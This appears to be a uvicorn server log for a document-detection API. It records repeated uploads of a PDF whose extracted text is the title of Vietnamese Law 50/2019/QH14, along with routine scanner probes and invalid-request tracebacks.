+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:55538 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:57117 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:35412 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:58094 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:48569 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:57189 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:60832 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:43114 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+INFO:     123.24.206.26:58710 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:34322 - "POST /detect_pdf HTTP/1.1" 200 OK
+INFO:     198.235.24.130:60058 - "GET / HTTP/1.1" 404 Not Found
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:38783 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:43175 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:39427 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:33034 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:56865 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:58972 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:65168 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:42473 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:36589 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:54663 - "POST /detect_pdf HTTP/1.1" 200 OK
+INFO:     198.235.24.45:60184 - "GET / HTTP/1.1" 404 Not Found
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:42425 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:61579 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:64519 - "POST /detect_pdf HTTP/1.1" 200 OK
+INFO:     198.235.24.9:61902 - "GET / HTTP/1.1" 404 Not Found
+INFO:     35.166.160.128:45086 - "GET / HTTP/1.1" 404 Not Found
+test_n.jpg
+INFO:     123.24.206.26:55546 - "POST /detect_pdf HTTP/1.1" 200 OK
+ảnh LSD101.jpg
+INFO:     123.24.206.26:47437 - "POST /detect_pdf HTTP/1.1" 200 OK
+INFO:     123.24.206.26:46652 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:54294 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     167.248.133.44:36902 - "GET / HTTP/1.1" 404 Not Found
+INFO:     167.248.133.44:44642 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserError: Pause on PRI/Upgrade
+INFO:     198.235.24.148:60174 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:37139 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.15:64106 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:52111 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.145:65064 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.235.24.53:50376 - "GET / HTTP/1.0" 404 Not Found
+INFO:     198.235.24.37:60536 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:48672 - "GET /manage/account/login HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:58296 - "GET /admin/index.html HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:49468 - "GET /index.html HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:53409 - "GET / HTTP/1.1" 404 Not Found
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:62041 - "POST /detect_pdf HTTP/1.1" 200 OK
+cmnd.jpg
+INFO:     123.24.206.26:64556 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:46183 - "POST /detect_pdf HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     141.255.166.2:35750 - "GET / HTTP/1.1" 404 Not Found
+INFO:     87.236.176.202:55837 - "GET / HTTP/1.1" 404 Not Found
+INFO:     141.255.166.2:59340 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     141.255.166.2:60300 - "GET / HTTP/1.1" 404 Not Found
+INFO:     185.180.143.75:49314 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:60249 - "GET / HTTP/1.1" 404 Not Found
+INFO:     162.142.125.220:54214 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserError: Pause on PRI/Upgrade
+INFO:     141.255.166.2:44308 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ;
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM
+Độc lập - Tự do - Hạnh phúc
+INFO:     123.24.206.26:59823 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:45496 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:58147 - "POST /detect_pdf HTTP/1.1" 200 OK
+INFO:     141.255.166.2:35180 - "GET / HTTP/1.1" 404 Not Found
+INFO:     141.255.166.2:54432 - "GET / HTTP/1.1" 404 Not Found
+INFO:     141.255.166.2:40694 - "GET / HTTP/1.1" 404 Not Found
+INFO:     141.255.166.2:43102 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     141.255.166.2:51388 - "GET / HTTP/1.1" 404 Not Found
+INFO:     141.255.166.2:54738 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     141.255.166.2:40874 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.235.24.58:58170 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.41:59760 - "GET / HTTP/1.1" 404 Not Found
+INFO:     141.255.166.2:46328 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.235.24.41:61944 - "GET / HTTP/1.1" 404 Not Found
+INFO:     159.203.32.77:61953 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:50952 - "POST /detect_pdf HTTP/1.1" 200 OK
+cccd.jpg
+INFO:     123.24.206.26:39933 - "POST /detect_pdf HTTP/1.1" 200 OK
+cmnd.jpg
+INFO:     123.24.206.26:44905 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:46716 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101-1.jpg
+INFO:     123.24.206.26:33241 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:37010 - "POST /detect_pdf HTTP/1.1" 200 OK
+INFO:     141.255.166.2:40110 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.235.24.10:63394 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
